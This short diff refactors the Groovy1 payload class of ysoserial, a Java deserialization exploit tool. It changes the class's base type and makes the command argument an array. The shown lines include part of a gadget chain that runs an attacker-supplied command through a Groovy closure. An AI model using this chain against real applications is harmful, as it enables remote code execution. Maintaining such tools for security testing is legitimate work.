@@ -29,9 +29,9 @@ import ysoserial.payloads.util.PayloadRunner;
 @SuppressWarnings({ "rawtypes", "unchecked" })
 @Dependencies({"org.codehaus.groovy:groovy:2.3.9"})
 @Authors({ Authors.FROHOFF })
-public class Groovy1 extends PayloadRunner implements ObjectPayload<InvocationHandler> {
+public class Groovy1 extends ExtendedObjectPayload<InvocationHandler> {
 
-	public InvocationHandler getObject(final String command) throws Exception {
+	public InvocationHandler getObject(final String[] command) throws Exception {
 		final ConvertedClosure closure = new ConvertedClosure(new MethodClosure(command, "execute"), "entrySet");
 
 		final Map map = Gadgets.createProxy(closure, Map.class);
